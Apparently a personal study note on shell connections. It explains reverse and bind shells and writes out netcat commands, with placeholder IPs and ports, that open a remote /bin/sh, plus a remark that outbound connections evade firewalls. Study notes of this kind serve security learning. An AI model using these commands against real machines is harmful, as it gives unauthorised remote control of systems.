node.name: Shell Connections
node.rich_text: Shell connections can be made using various tools to open and connect to a port, ex:

1)Reverse Shells: Open a port in target machine and have it connect to us, this is preferred since firewalls don't really block outgoing connections.
ex:
= nc -lvp(open port and listen to connections) <port>(port number to open),

=nc <ip> <port> -e(execute) /bin/sh (to execute shell on target machine once connection established, i.e get a shell access of target machine on attack machine)
2)Bind Shell: Attacker connects to the machine, hence has to bypass firewall also.
ex:
= nc <ip> <port> (connect to target machine), targ= nc -lvp <port> -e /bin/sh (open port, listen for connections and execute shell over that connection once established)
